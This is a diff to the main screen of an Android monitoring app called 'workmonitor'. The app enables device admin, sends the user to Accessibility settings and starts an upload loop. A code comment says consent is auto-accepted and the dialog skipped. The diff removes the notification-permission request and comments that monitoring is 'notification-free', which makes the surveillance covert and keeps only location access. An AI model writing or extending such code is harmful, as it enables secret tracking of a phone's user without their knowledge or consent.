@@ -1,7 +1,6 @@
 package com.workmonitor
 
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.app.AlertDialog
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -17,6 +16,7 @@ import androidx.appcompat.app.AppCompatActivity
 /**
  * Dev-mode: auto-accept consent, skip the dialog.
  * Only guide user to enable Accessibility service.
+ * No notification permission is requested — monitoring is notification-free.
  */
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -31,8 +31,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         enableDeviceAdmin()
-        requestNotificationPermission()
-        BootReceiver.startNow(this)   // register + heartbeat immediately
+        BootReceiver.startNow(this)   // kick the upload loop immediately
 
         refreshStatus()
         findViewById<Button>(R.id.btn_settings).setOnClickListener {
@@ -52,12 +51,9 @@ class MainActivity : AppCompatActivity() {
                       else "Monitoring PAUSED — tap the button to re-enable Accessibility"
     }
 
-    /** Request runtime permissions (notification on 13+, location up to 30) in one batch. */
-    private fun requestNotificationPermission() {
+    /** Request runtime location permission (up to 30) — NO notification prompt. */
+    private fun requestLocationPermission() {
         val perms = ArrayList<String>()
-        if (android.os.Build.VERSION.SDK_INT >= 33 &&
-            checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED)
-            perms.add(android.Manifest.permission.POST_NOTIFICATIONS)
         if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED)
             perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
         else if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED)
@@ -83,5 +79,6 @@ class MainActivity : AppCompatActivity() {
             startActivity(intent)
         }
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        requestLocationPermission()
     }
 }
